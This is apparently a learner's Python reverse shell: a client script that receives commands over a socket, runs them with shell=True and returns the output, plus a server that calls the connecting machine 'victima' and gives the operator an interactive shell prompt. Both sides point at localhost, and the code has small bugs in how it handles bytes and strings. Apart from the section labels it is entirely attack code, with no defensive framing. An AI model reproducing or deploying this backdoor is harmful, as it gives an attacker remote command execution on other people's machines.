#Client Code
#!/usr/bin/env python
#_*_ coding: utf8 _*_

import socket
import subprocess

cliente=socket.socket()

try:
    cliente.connect(('localhost',8080))
    cliente.send("1".encode("ascii"))

    while True:
        comand_b=cliente.recv(1024)
        comand_c=comand_b.decode("ascii")
        comand=subprocess.Popen(comand_c,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        if comand.stderr.read() != "":
            cliente.send("error de comando")
        else:
            cliente.send(comand.stdout.read())
except:
    pass

#ServerCode
#!/usr/bin/env python
#_*_ coding: utf8 _*_

import socket

def main():
    server=socket.socket()
    server.bind(('localhost',8080))
    server.listen(1)

    while True:
        victima,direccion=server.accept()
        print("Connected to: {}".format(direccion))
        msjb=victima.recv(1024)
        msjc=msjb.decode("ascii")

        if msjc=="1":
            while True:
                opcion=input("shell@shell: ")
                victima.send(opcion.encode("ascii"))
                resultado=victima.recv(2048)
                print(resultado)
        else:
            print("There is an error")


if __name__=="__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()